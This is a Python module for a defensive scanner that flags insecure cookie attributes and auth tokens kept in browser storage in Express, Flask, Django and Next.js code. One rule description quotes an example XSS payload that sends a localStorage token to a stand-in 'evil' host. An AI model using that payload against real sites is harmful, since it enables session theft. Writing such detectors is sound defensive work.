"""Browser identity & cookie hygiene patterns.

Wave-24 distillation round 10 — browser identity layer.

Catalogue of 6 anti-patterns covering the surface that decides whether
a stolen XSS read is a session takeover or a harmless DOM leak: how
server-side code emits `Set-Cookie` (Express `res.cookie`, Flask
`response.set_cookie`, Django `SESSION_COOKIE_*` settings, Next.js
`cookies().set`) AND how client-side code persists auth material in
`localStorage` / `sessionStorage`.

Source distillation report:
`reports/distill-round-10/browser-cookie-hygiene.md`

What is NOT here (already shipped — DO NOT duplicate):

  * Generic `Set-Cookie` emission via header-write APIs —
    `http_header_patterns.py` (Wave 20).
  * JWT algorithm / claim laxity — `jwt_deeper_patterns.py`.
  * Access-Control-Allow-Origin / credentials laxity —
    `cors_misconfig_patterns.py`.
  * XSS sinks (`dangerouslySetInnerHTML`, `v-html`, prototype
    pollution, `eval()`) — `frontend_patterns.py`.
  * OAuth state / PKCE / nonce — `auth_flow_patterns.py`.

What IS here (6 net-new rules, regex-only, all RE2-safe):

  * bch-auth-token-in-local-storage                            (HIGH)
  * bch-auth-token-in-session-storage                          (HIGH)
  * bch-cookie-set-no-httponly                                 (HIGH)
  * bch-cookie-samesite-none-no-secure                         (CRITICAL)
  * bch-django-cookie-secure-false-prod                        (HIGH)
  * bch-host-prefix-cookie-violated                            (MEDIUM)

Public surface:

  * Rule(id, name, severity, description, pattern, owasp_asi)
  * RULES — ordered tuple of every rule.
  * scan_text(text) -> list[Finding]
  * Finding(rule_id, line, column, matched_text, severity, description,
            owasp_asi) — frozen NamedTuple, mirrors
            chat_bot_patterns.Finding shape.

OWASP ASI mapping used:
  ASI-04 — Insecure output / data leak (auth token in DOM-readable
                                          storage).
  ASI-06 — Improper validation / authority (cookie scope / visibility
                                              / transport).
  ASI-07 — Authority / authorisation gaps (`SameSite=None` cross-site
                                            CSRF).

All regexes are RE2-compatible (no backreferences, no lookbehind, no
catastrophic backtracking shapes; bounded `[^...]{0,N}` character
classes cap engine work). Patterns are PRE-COMPILED at module load.
Fail-fast: callers receive structured Finding tuples, never raised
exceptions on benign input.
"""

from __future__ import annotations

import re
from typing import NamedTuple

# ---- Data model ---------------------------------------------------------


class Finding(NamedTuple):
    """A single rule match — same shape as chat_bot_patterns.Finding."""

    rule_id: str
    line: int
    column: int
    matched_text: str
    severity: str
    description: str
    owasp_asi: str


class Rule(NamedTuple):
    """A rule definition. Patterns are PRE-COMPILED at module load."""

    id: str
    name: str
    severity: str
    description: str
    pattern: re.Pattern  # noqa: UP006 — keep stdlib name
    owasp_asi: str


def _re(pattern: str) -> re.Pattern:
    """Compile with MULTILINE+UNICODE — IGNORECASE is OPT-IN per pattern
    (some patterns must distinguish case, e.g. `SESSION_COOKIE_SECURE`
    vs. lowercase variants). RE2-safe: no nested quantifiers, no
    backreferences, no lookbehind."""
    return re.compile(pattern, re.MULTILINE | re.UNICODE)


def _re_i(pattern: str) -> re.Pattern:
    """Same as _re but with IGNORECASE — for patterns where the cookie
    attribute name spelling varies (`httpOnly` / `httponly` /
    `HttpOnly`)."""
    return re.compile(pattern, re.IGNORECASE | re.MULTILINE | re.UNICODE)


# ---- P1 : bch-auth-token-in-local-storage --------------------------------


# Anchor: `localStorage.setItem(` with optional `window.` prefix and a
# first-argument string literal matching a known auth-token-shaped key.
# Bounded by the quote chars so the engine never wanders past the key.
_LOCALSTORAGE_AUTH_KEY = _re_i(
    r"\b(?:window\s*\.\s*)?localStorage\s*\.\s*setItem\s*\(\s*"
    r"['\"]"
    r"(?:auth[_\-]?token|access[_\-]?token|refresh[_\-]?token"
    r"|bearer|jwt|id[_\-]?token|api[_\-]?key|github[_\-]?token"
    r"|session[_\-]?token|token)"
    r"['\"]"
)


# ---- P2 : bch-auth-token-in-session-storage ------------------------------


# Mirror of P1 for sessionStorage. Same JS-readable surface, just
# tab-scoped vs. origin-scoped — equivalent risk on the XSS axis.
_SESSIONSTORAGE_AUTH_KEY = _re_i(
    r"\b(?:window\s*\.\s*)?sessionStorage\s*\.\s*setItem\s*\(\s*"
    r"['\"]"
    r"(?:auth[_\-]?token|access[_\-]?token|refresh[_\-]?token"
    r"|bearer|jwt|id[_\-]?token|api[_\-]?key|github[_\-]?token"
    r"|session[_\-]?token|token)"
    r"['\"]"
)


# ---- P3 : bch-cookie-set-no-httponly -------------------------------------


# Anchor: cookie-set call on a session-shaped cookie name. The bounded
# `[^'\"]{0,80}` keeps the inner span finite; `[^)]{0,400}` caps the
# options-blob scan. NO IGNORECASE — we accept the JS spelling space
# (sessionId, Token, etc.) via lowercase in the corpus and the post
# filter is case-insensitive on attribute spellings only.
_COOKIE_SET_JS_SHAPE = _re_i(
    r"\b(?:res|reply|response)\s*\.\s*cookie\s*\(\s*"
    r"['\"][^'\"]{0,80}(?:session|token|auth|sid|jwt|csrf|connect\.sid)"
    r"[^'\"]{0,80}['\"]"
    r"[^)]{0,400}\)"
)


_COOKIE_SET_PY_SHAPE = _re_i(
    r"\b(?:response|resp|res)\s*\.\s*set_cookie\s*\(\s*"
    r"['\"][^'\"]{0,80}(?:session|token|auth|sid|jwt|csrf)"
    r"[^'\"]{0,80}['\"]"
    r"[^)]{0,400}\)"
)


# Post-filter: span contains HttpOnly opt-in in any spelling. RE2-safe
# alternation only; no nested quantifiers.
_HTTPONLY_OPTIN_JS = _re_i(
    r"\b(?:httpOnly|httponly|http_only)\s*:\s*true\b"
)


_HTTPONLY_OPTIN_PY = _re_i(
    r"\bhttponly\s*=\s*True\b"
)


# CSRF double-submit-pattern context — when present, the auth-shaped
# `_csrf` cookie name is intentionally JS-readable. Suppresses P3.
_CSRF_DOUBLE_SUBMIT_CONTEXT = _re_i(
    r"\b(?:csurf|csrf[_\-]csrf|next[_\-]csrf|django\.middleware\.csrf"
    r"|x[_\-]csrf[_\-]token)\b"
)


# ---- P4 : bch-cookie-samesite-none-no-secure -----------------------------


# JS shape: `sameSite: 'none'` (any case). We do NOT swallow the
# options-blob in the anchor; the `[^}]{0,400}` cap is on the post
# filter only.
_SAMESITE_NONE_JS = _re_i(
    r"\bsameSite\s*:\s*['\"]?none['\"]?"
)


# Python shape: `samesite="None"` (Flask / FastAPI / Django ORM kwargs).
_SAMESITE_NONE_PY = _re_i(
    r"\bsamesite\s*=\s*['\"]?none['\"]?"
)


# Django settings module shape: line-anchored top-level assignment.
# NO IGNORECASE — the canonical settings spelling is uppercase.
_SAMESITE_NONE_DJANGO = _re(
    r"^[ \t]*(?:SESSION_COOKIE_SAMESITE|CSRF_COOKIE_SAMESITE)\s*=\s*"
    r"['\"]?[Nn]one['\"]?"
)


# Post-filter: `secure: true` / `secure=True` / settings `_SECURE=True`
# nearby. Three spellings unified into one pattern (RE2 alternation).
_SECURE_TRUE_NEARBY = _re_i(
    r"\bsecure\s*:\s*true\b"
    r"|"
    r"\bsecure\s*=\s*True\b"
    r"|"
    r"^[ \t]*(?:SESSION_COOKIE_SECURE|CSRF_COOKIE_SECURE)\s*=\s*True\b"
)


# ---- P5 : bch-django-cookie-secure-false-prod ----------------------------


# Explicit `=False` form — most common and unambiguous. Line-anchored.
_DJANGO_COOKIE_SECURE_FALSE = _re(
    r"^[ \t]*(?:SESSION_COOKIE_SECURE|CSRF_COOKIE_SECURE)\s*=\s*False\b"
)


# Production guard: `DEBUG = False` declared in the same module. When
# present without a corresponding `SESSION_COOKIE_SECURE = True`, the
# implicit default (False) is the same vulnerability.
_DJANGO_DEBUG_FALSE = _re(
    r"^[ \t]*DEBUG\s*=\s*False\b"
)


# Explicit secure-true line — line-anchored, used to confirm presence.
_DJANGO_SESSION_COOKIE_SECURE_TRUE = _re(
    r"^[ \t]*SESSION_COOKIE_SECURE\s*=\s*True\b"
)


# Dev-branch guard — when the assignment is inside a `if DEBUG:` /
# `if not PRODUCTION:` etc. block, suppress. We match the guard line
# itself; the scanner walks the surrounding 10-line window.
_DEV_BRANCH_GUARD = _re(
    r"^[ \t]*if\s+(?:DEBUG\b"
    r"|not\s+PRODUCTION\b"
    r"|os\.environ\s*\.\s*get\s*\(\s*['\"]DEV"
    r"|env\s*\.\s*bool\s*\(\s*['\"]PRODUCTION"
    r"|['\"]DEV['\"]\s+in\s+os\.environ"
    r")"
)


# ---- P6 : bch-host-prefix-cookie-violated --------------------------------


# Anchor: a cookie call whose NAME literal starts with `__Host-` or
# `__Secure-`. Both JS and Python shapes.
_HOST_PREFIX_COOKIE_JS = _re(
    r"\b(?:res|reply|response)\s*\.\s*cookie\s*\(\s*"
    r"['\"]__(?:Host|Secure)-[^'\"]{0,80}['\"]"
    r"[^)]{0,400}\)"
)


_HOST_PREFIX_COOKIE_PY = _re(
    r"\b(?:response|resp|res)\s*\.\s*set_cookie\s*\(\s*"
    r"['\"]__(?:Host|Secure)-[^'\"]{0,80}['\"]"
    r"[^)]{0,400}\)"
)


# Detect the `__Host-` form specifically — the post-filter needs to
# distinguish `__Host-` (stricter contract) from `__Secure-`.
_HOST_PREFIX_NAME_HOST = _re(
    r"['\"]__Host-[^'\"]{0,80}['\"]"
)


# Contract checks inside the call's option blob.
_PATH_ROOT_JS = _re_i(r"\bpath\s*:\s*['\"]/['\"]")
_PATH_ROOT_PY = _re_i(r"\bpath\s*=\s*['\"]/['\"]")
_DOMAIN_PRESENT_JS = _re_i(r"\bdomain\s*:")
_DOMAIN_PRESENT_PY = _re_i(r"\bdomain\s*=")
_SECURE_TRUE_JS = _re_i(r"\bsecure\s*:\s*true\b")
_SECURE_TRUE_PY = _re_i(r"\bsecure\s*=\s*True\b")


# ---- The catalogue ------------------------------------------------------


RULES: tuple[Rule, ...] = (
    Rule(
        id="bch-auth-token-in-local-storage",
        name="Auth/bearer/JWT token persisted to localStorage",
        severity="HIGH",
        description=(
            "`localStorage.setItem('token' | 'access_token' | "
            "'refresh_token' | 'jwt' | 'api_key' | ...)` — JS-readable "
            "browser storage holding an auth credential. Any XSS that "
            "lands once exfiltrates the session in a single round-trip "
            "(`<img onerror=fetch('//evil/x?'+localStorage.getItem('token'))>`). "
            "Service workers, browser extensions with `<all_urls>`, "
            "and dev-tools-open users with pasted console code all read "
            "this storage without prompt. The HttpOnly cookie "
            "alternative exists precisely so the token sits OUTSIDE "
            "JavaScript's reach — choosing `localStorage` re-introduces "
            "the exact attack the flag was designed to prevent."
        ),
        pattern=_LOCALSTORAGE_AUTH_KEY,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="bch-auth-token-in-session-storage",
        name="Auth/bearer/JWT token persisted to sessionStorage",
        severity="HIGH",
        description=(
            "`sessionStorage.setItem('token' | 'access_token' | ...)` — "
            "same JS-readable surface as localStorage, just tab-scoped "
            "instead of origin-scoped. XSS-readable in the same single "
            "round-trip; the lifetime difference does NOT reduce the "
            "exfil attack surface. Use HttpOnly cookies for session "
            "credentials."
        ),
        pattern=_SESSIONSTORAGE_AUTH_KEY,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="bch-cookie-set-no-httponly",
        name="Session-shaped cookie set without HttpOnly attribute",
        severity="HIGH",
        description=(
            "Express `res.cookie(...)`, Flask `response.set_cookie(...)`, "
            "or Next.js `cookies().set(...)` emits a cookie whose name "
            "matches `session|token|auth|sid|jwt|csrf|connect.sid` "
            "WITHOUT the HttpOnly opt-in. The platform defaults are all "
            "`httpOnly = false` if the option is omitted — silence is "
            "consent for JS-readable cookies. The HttpOnly flag is the "
            "difference between 'XSS leaks the DOM' (recoverable) and "
            "'XSS leaks the session' (incident — every action the user "
            "could have taken is now attacker-controlled). CSP blocks "
            "script EXECUTION, not script READING of `document.cookie`."
        ),
        pattern=_COOKIE_SET_JS_SHAPE,
        owasp_asi="ASI-06",
    ),
    Rule(
        id="bch-cookie-samesite-none-no-secure",
        name="Cookie declared SameSite=None without sibling Secure attribute",
        severity="CRITICAL",
        description=(
            "`sameSite: 'none'` / `samesite='None'` / "
            "`SESSION_COOKIE_SAMESITE = 'None'` declared WITHOUT a "
            "matching `secure: true` / `secure=True` / "
            "`SESSION_COOKIE_SECURE = True`. Browsers (Chrome since 80, "
            "all majors followed) REQUIRE `Secure` when SameSite=None — "
            "the cookie is silently rejected without it. Dev sees 'auth "
            "doesn't work cross-site' and adds `Secure` blindly, "
            "recreating the same one-click cross-origin CSRF hole over "
            "HTTPS. State-changing endpoints relying on cookie auth "
            "with SameSite=None require EITHER a custom request header "
            "(forces preflight) OR a CSRF token — without one of those "
            "every cross-site form submission with credentials is a "
            "CSRF write."
        ),
        pattern=_SAMESITE_NONE_JS,
        owasp_asi="ASI-07",
    ),
    Rule(
        id="bch-django-cookie-secure-false-prod",
        name="Django settings declare SESSION_COOKIE_SECURE=False (or omit it) in prod module",
        severity="HIGH",
        description=(
            "Django `SESSION_COOKIE_SECURE = False` / "
            "`CSRF_COOKIE_SECURE = False` at module top-level of a "
            "production settings file — OR the same module has "
            "`DEBUG = False` without a corresponding "
            "`SESSION_COOKIE_SECURE = True` (the default is False; "
            "absence equals insecure). The `Secure`-less session cookie "
            "is sent in cleartext on any HTTP downgrade — user clicks a "
            "`http://app.example.com` link in an email, browser sends "
            "the cookie unencrypted before the HSTS redirect kicks in. "
            "On-path attackers (Wi-Fi, ISP capture, hotel network) read "
            "the session ID. HSTS mitigates after first visit only; "
            "the first visit IS the leak window."
        ),
        pattern=_DJANGO_COOKIE_SECURE_FALSE,
        owasp_asi="ASI-06",
    ),
    Rule(
        id="bch-host-prefix-cookie-violated",
        name="Cookie name starts __Host- or __Secure- but violates RFC 6265bis name-prefix contract",
        severity="MEDIUM",
        description=(
            "A cookie whose name starts `__Host-` requires (1) `Secure`, "
            "(2) `Path=/`, AND (3) NO `Domain=`. A cookie whose name "
            "starts `__Secure-` requires `Secure`. Any violation causes "
            "the browser to SILENTLY REJECT the cookie — server returns "
            "200 OK, client sees no cookie, the next request is "
            "unauthenticated. Classic symptom: 'auth works locally but "
            "breaks in staging' because dev used a different cookie "
            "name. The 'fix' developers reach for is removing the "
            "`__Host-` prefix — restoring the cookie but downgrading "
            "the browser-enforced identity scope guarantee."
        ),
        pattern=_HOST_PREFIX_COOKIE_JS,
        owasp_asi="ASI-06",
    ),
)


# ---- Scanner-level helpers ---------------------------------------------


def _line_col(text: str, offset: int) -> tuple[int, int]:
    """Convert a string offset into (1-based line, 1-based column)."""
    before = text[:offset]
    line = before.count("\n") + 1
    col = offset - (before.rfind("\n") + 1) + 1
    return (line, col)


def _slice_window(text: str, line_no: int, backward: int, forward: int) -> str:
    """Return up to `backward` lines preceding line_no plus line_no
    itself plus the next `forward` lines."""
    parts = text.split("\n")
    start = max(0, line_no - 1 - backward)
    end = min(len(parts), line_no + forward)
    return "\n".join(parts[start:end])


def _file_contains(text: str, pat: re.Pattern) -> bool:
    return pat.search(text) is not None


# ---- The composed scanner ----------------------------------------------


def scan_text(text: str) -> list[Finding]:
    """Run every applicable RULES pattern against `text` and return findings.

    Stage-B post-filters consult the matched span (and, for Django
    rules, surrounding lines) to suppress correct usage:

      * P3 (cookie-set-no-httponly) — anchor on a session-shaped cookie
        call; suppress if the match span (the options blob) contains
        `httpOnly: true` (any case) — or if the file imports a CSRF
        double-submit library AND the cookie name is `_csrf`.
      * P4 (cookie-samesite-none-no-secure) — anchor on
        `sameSite:'none'` / `samesite='None'` / Django setting; suppress
        if a `secure: true` / `secure=True` / `SESSION_COOKIE_SECURE=True`
        marker is present in the same 10-line window.
      * P5 (django-cookie-secure-false-prod) — fires on explicit
        `=False` line-anchored matches AND on the absence form: a
        Django settings file with `DEBUG = False` at top level but NO
        `SESSION_COOKIE_SECURE = True` anywhere. Suppress when the
        match is inside an `if DEBUG:` / `if not PRODUCTION:` / etc.
        dev-branch guard (10-line backward window).
      * P6 (host-prefix-cookie-violated) — anchor on a cookie name
        starting `__Host-` or `__Secure-`; emit a finding only when
        the call violates the contract (`__Host-` missing Secure OR
        missing Path=/ OR carrying Domain; `__Secure-` missing Secure).

    Findings are deduped by (rule_id, line, col).
    """
    if not text:
        return []

    findings: list[Finding] = []
    seen: set[tuple[str, int, int]] = set()

    def _emit(rule: Rule, offset: int, matched: str) -> None:
        line, col = _line_col(text, offset)
        key = (rule.id, line, col)
        if key in seen:
            return
        seen.add(key)
        snippet = matched if len(matched) <= 200 else matched[:200] + "…"
        findings.append(
            Finding(
                rule_id=rule.id,
                line=line,
                column=col,
                matched_text=snippet,
                severity=rule.severity,
                description=rule.description,
                owasp_asi=rule.owasp_asi,
            )
        )

    rule_by_id = {r.id: r for r in RULES}

    # ---- P1 : bch-auth-token-in-local-storage ----
    rule_p1 = rule_by_id["bch-auth-token-in-local-storage"]
    for m in _LOCALSTORAGE_AUTH_KEY.finditer(text):
        _emit(rule_p1, m.start(), m.group(0))

    # ---- P2 : bch-auth-token-in-session-storage ----
    rule_p2 = rule_by_id["bch-auth-token-in-session-storage"]
    for m in _SESSIONSTORAGE_AUTH_KEY.finditer(text):
        _emit(rule_p2, m.start(), m.group(0))

    # ---- P3 : bch-cookie-set-no-httponly ----
    rule_p3 = rule_by_id["bch-cookie-set-no-httponly"]
    has_csrf_context = _file_contains(text, _CSRF_DOUBLE_SUBMIT_CONTEXT)
    # JS shape (Express / Next.js / Fastify reply / generic res)
    for m in _COOKIE_SET_JS_SHAPE.finditer(text):
        span = m.group(0)
        if _HTTPONLY_OPTIN_JS.search(span) is not None:
            continue
        # Suppress when the file uses CSRF double-submit pattern AND
        # the matched cookie name is a CSRF cookie (intentionally
        # JS-readable). The cookie-name token is inside the matched
        # span — a simple check on the span string suffices.
        if has_csrf_context and "csrf" in span.lower():
            continue
        _emit(rule_p3, m.start(), span)
    # Python shape (Flask / Django Response / FastAPI)
    for m in _COOKIE_SET_PY_SHAPE.finditer(text):
        span = m.group(0)
        if _HTTPONLY_OPTIN_PY.search(span) is not None:
            continue
        if has_csrf_context and "csrf" in span.lower():
            continue
        _emit(rule_p3, m.start(), span)

    # ---- P4 : bch-cookie-samesite-none-no-secure ----
    rule_p4 = rule_by_id["bch-cookie-samesite-none-no-secure"]
    samesite_iters = (
        _SAMESITE_NONE_JS.finditer(text),
        _SAMESITE_NONE_PY.finditer(text),
        _SAMESITE_NONE_DJANGO.finditer(text),
    )
    for itr in samesite_iters:
        for m in itr:
            line, _ = _line_col(text, m.start())
            # 10-line bidirectional window catches both inline-options
            # blob (Express literal object) and module-level Django
            # settings (the SECURE flag is usually on an adjacent line).
            window = _slice_window(text, line, 10, 10)
            if _SECURE_TRUE_NEARBY.search(window) is not None:
                continue
            _emit(rule_p4, m.start(), m.group(0))

    # ---- P5 : bch-django-cookie-secure-false-prod ----
    rule_p5 = rule_by_id["bch-django-cookie-secure-false-prod"]
    # Explicit `=False` form
    for m in _DJANGO_COOKIE_SECURE_FALSE.finditer(text):
        line, _ = _line_col(text, m.start())
        # Suppress if the match falls inside a dev-branch guard. The
        # guard appears in the 10-line backward window from the match
        # line.
        backward_window = _slice_window(text, line, 10, 0)
        if _DEV_BRANCH_GUARD.search(backward_window) is not None:
            continue
        _emit(rule_p5, m.start(), m.group(0))
    # Absence form: `DEBUG = False` at top level AND no
    # `SESSION_COOKIE_SECURE = True` anywhere. Emit at the DEBUG line.
    debug_false_matches = list(_DJANGO_DEBUG_FALSE.finditer(text))
    if debug_false_matches and not _file_contains(
        text, _DJANGO_SESSION_COOKIE_SECURE_TRUE
    ):
        # Skip absence-form emission if the file ALSO contains an
        # explicit-False line — the explicit rule already covers it.
        if not _file_contains(text, _DJANGO_COOKIE_SECURE_FALSE):
            first = debug_false_matches[0]
            _emit(rule_p5, first.start(), first.group(0))

    # ---- P6 : bch-host-prefix-cookie-violated ----
    rule_p6 = rule_by_id["bch-host-prefix-cookie-violated"]
    # JS shape
    for m in _HOST_PREFIX_COOKIE_JS.finditer(text):
        span = m.group(0)
        is_host_prefix = _HOST_PREFIX_NAME_HOST.search(span) is not None
        secure_ok = _SECURE_TRUE_JS.search(span) is not None
        path_root_ok = _PATH_ROOT_JS.search(span) is not None
        domain_present = _DOMAIN_PRESENT_JS.search(span) is not None
        if is_host_prefix:
            # __Host- contract: Secure AND Path='/' AND no Domain=
            if secure_ok and path_root_ok and not domain_present:
                continue
        else:
            # __Secure- contract: Secure only
            if secure_ok:
                continue
        _emit(rule_p6, m.start(), span)
    # Python shape
    for m in _HOST_PREFIX_COOKIE_PY.finditer(text):
        span = m.group(0)
        is_host_prefix = _HOST_PREFIX_NAME_HOST.search(span) is not None
        secure_ok = _SECURE_TRUE_PY.search(span) is not None
        path_root_ok = _PATH_ROOT_PY.search(span) is not None
        domain_present = _DOMAIN_PRESENT_PY.search(span) is not None
        if is_host_prefix:
            if secure_ok and path_root_ok and not domain_present:
                continue
        else:
            if secure_ok:
                continue
        _emit(rule_p6, m.start(), span)

    findings.sort(key=lambda f: (f.line, f.column, f.rule_id))
    return findings
